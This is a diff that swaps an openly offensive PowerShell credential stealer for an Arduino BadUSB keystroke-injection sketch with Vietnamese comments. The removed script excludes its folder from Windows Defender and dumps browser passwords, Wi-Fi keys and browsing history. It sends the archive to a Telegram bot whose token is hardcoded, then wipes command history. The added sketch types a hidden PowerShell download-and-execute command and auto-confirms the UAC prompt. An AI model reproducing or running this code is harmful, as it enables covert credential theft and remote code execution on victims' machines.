@@ -1,117 +1,104 @@
-#                      _                        
-#  _   _  ___  _   _  | | ___ __   _____      __
-# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
-# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
-#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
-#  |___/                                        
+#include <Arduino.h>
+#include "USB.h"
+#include "USBHIDKeyboard.h"
 
-$basePath = "C:\Users\Public\Documents\scripts"
-$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
-$dumpFile = "$dumpFolder.zip"
+USBHIDKeyboard Keyboard;
 
-# Create directory
-New-Item -ItemType Directory -Path $basePath -Force | Out-Null
-Set-Location $basePath
-New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
-Add-MpPreference -ExclusionPath $basePath -Force
+const int buttonPin = 0; // Nút BOOT trên mạch Lolin S2 Mini
+const int ledPin = 15;   // Đèn LED tích hợp trên mạch Lolin S2 Mini (thường là chân 15)
 
-# Download necessary tools
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe
+void setup() {
+  pinMode(buttonPin, INPUT_PULLUP);
+  pinMode(ledPin, OUTPUT);
+  digitalWrite(ledPin, LOW); // Tắt LED ban đầu
 
+  // Khởi động cổng Serial để ghi log (Tốc độ baud: 115200)
+  Serial.begin(115200);
+  
+  // Khởi động Bàn phím ảo
+  Keyboard.begin();
+  USB.begin();
 
-# Execute tools to gather data
-.\WNetWatcher.exe /stext connected_devices.txt
-.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt
-.\WebBrowserPassView.exe /stext passwords.txt
-.\WirelessKeyView.exe /stext wifi.txt
-
-# Wait for the files to be fully written
-while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
-    Start-Sleep -Seconds 1
+  // Đợi một chút để cổng Serial ổn định
+  delay(2000);
+  Serial.println("\n--- HỆ THỐNG BADUSB ĐÃ SẴN SÀNG ---");
+  Serial.println("[LOG] Chờ nhấn nút BOOT để bắt đầu tấn công...");
 }
 
-Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder"
+void loop() {
+  if (digitalRead(buttonPin) == LOW) {
+    delay(200); // Chống rung phím
+    digitalWrite(ledPin, HIGH); // Bật LED báo hiệu đang chạy
 
-# Compress extracted data
-Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
+    Serial.println("\n[LOG] BẮT ĐẦU CHUỖI THỰC THI PAYLOAD!");
 
-# Wait until the ZIP file is created
-while (!(Test-Path "$dumpFile")) {
-    Start-Sleep -Seconds 1
-}
+    // ==========================================
+    // BƯỚC 1: ẨN CỬA SỔ
+    // ==========================================
+    Serial.println("[LOG] Bước 1/6: Đang thu nhỏ các cửa sổ (Win + D)...");
+    delay(2500); 
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press('d');
+    delay(100);
+    Keyboard.releaseAll();
+    delay(500);
 
-# ===============================================================================
-# [THÊM MỚI] LƯU LẠI BẢN SAO RA MÀN HÌNH DESKTOP ĐỂ DEMO DỄ NHÌN
-# ===============================================================================
-$desktopPath = "$env:USERPROFILE\Desktop\DuLieu_BadUSB_$env:USERNAME.zip"
-Copy-Item -Path $dumpFile -Destination $desktopPath -Force
-# ===============================================================================
+    // ==========================================
+    // BƯỚC 2: MỞ HỘP THOẠI RUN
+    // ==========================================
+    Serial.println("[LOG] Bước 2/6: Đang mở hộp thoại Run (Win + R)...");
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press('r');
+    delay(100);
+    Keyboard.releaseAll();
+    delay(500);
 
+    // ==========================================
+    // BƯỚC 3: GÕ LỆNH POWERSHELL
+    // ==========================================
+    Serial.println("[LOG] Bước 3/6: Đang nhập mã độc PowerShell...");
+    // Nhớ thay <LINK> bằng đường dẫn tải file ps.ps1 của bạn
+    Keyboard.print("powershell -w h -NoP -Ep Bypass -Command \"irm <LINK> | iex\"");
+    delay(200);
 
-# Telegram configuration
-$token = "8671014944:AAEfUUYGPdYuhVHYdBKq1EFqoNLbPMS99QQ"
-# $chatID = "8671014944"
-$chatID = "8688296089"
-$uri = "https://api.telegram.org/bot$token/sendDocument"
-$caption = "Here are exfiltrated informations from $env:USERNAME"
+    // ==========================================
+    // BƯỚC 4: KÍCH HOẠT QUYỀN ADMIN
+    // ==========================================
+    Serial.println("[LOG] Bước 4/6: Đang nhấn Ctrl+Shift+Enter để gọi quyền Admin...");
+    Keyboard.press(KEY_LEFT_CTRL);
+    Keyboard.press(KEY_LEFT_SHIFT);
+    Keyboard.press(KEY_RETURN);
+    delay(100);
+    Keyboard.releaseAll();
 
-# Check if the file exists before sending
-if (!(Test-Path $dumpFile)) {
-    exit 1
-}
-
-# Ensure System.Net.Http is available
-if (-not ("System.Net.Http.HttpClient" -as [type])) {
-    $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
-    if ($httpPath) {
-        Add-Type -Path $httpPath
-    } else {
-        exit 1
+    // ==========================================
+    // BƯỚC 5: VƯỢT QUA UAC
+    // ==========================================
+    Serial.println("[LOG] Bước 5/6: Đang chờ bảng UAC hiện lên (Đợi 2.5s)...");
+    delay(2500); 
+    
+    Serial.println("[LOG] Bước 5/6: Đang nhấn ALT + Y để vượt qua UAC...");
+    Keyboard.press(KEY_LEFT_ALT);
+    Keyboard.press('y');
+    delay(100);
+    Keyboard.releaseAll();
+    
+    // ==========================================
+    // BƯỚC 6: BÁO HIỆU HOÀN TẤT
+    // ==========================================
+    Serial.println("[LOG] Bước 6/6: Kịch bản đã gõ xong! Chờ file tải về (Nháy Caps Lock)...");
+    
+    for(int i = 0; i < 4; i++) {
+      Keyboard.press(KEY_CAPS_LOCK); delay(50); Keyboard.releaseAll();
+      delay(250); 
+      Keyboard.press(KEY_CAPS_LOCK); delay(50); Keyboard.releaseAll();
+      delay(250); 
     }
+
+    Serial.println("[LOG] === HOÀN TẤT CUỘC TẤN CÔNG ===");
+    Serial.println("[LOG] Bạn có thể rút USB ra ngay bây giờ.");
+    digitalWrite(ledPin, LOW); // Tắt đèn LED mạch
+    // Chờ nhả nút để tránh chạy lặp lại
+    while(digitalRead(buttonPin) == LOW) delay(10);
+  }
 }
-
-# Create HTTP client
-$client = New-Object System.Net.Http.HttpClient
-$content = New-Object System.Net.Http.MultipartFormDataContent
-$content.Add((New-Object System.Net.Http.StringContent($chatID)), "chat_id")
-$content.Add((New-Object System.Net.Http.StringContent($caption)), "caption")
-
-# Attach the ZIP file
-$filename = [System.IO.Path]::GetFileName("$dumpFile")
-$fileStream = [System.IO.File]::OpenRead("$dumpFile")
-$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
-$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
-$content.Add($fileContent, "document", $filename)
-
-# Send data to Telegram
-try {
-    $client.PostAsync($uri, $content).Wait()
-} catch {}
-
-# Cleanup
-$fileStream.Close()
-$fileStream.Dispose()
-
-Set-Location C:\Users\Public\Documents
-
-# ===============================================================================
-# [CHỈNH SỬA] ĐÃ VÔ HIỆU HÓA LỆNH XÓA ĐỂ GIỮ LẠI FILE TRONG CÙNG THƯ MỤC
-# ===============================================================================
-# Remove-Item -Recurse -Force scripts
-# Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents\scripts" -Force
-# ===============================================================================
-
-# Caps Lock signal
-$keyBoardObject = New-Object -ComObject WScript.Shell
-for ($i=0; $i -lt 4; $i++) {
-    $keyBoardObject.SendKeys("{CAPSLOCK}")
-    Start-Sleep -Seconds 1
-}
-
-# Clear command history
-Clear-Content (Get-PSReadlineOption).HistorySavePath
-
-exit
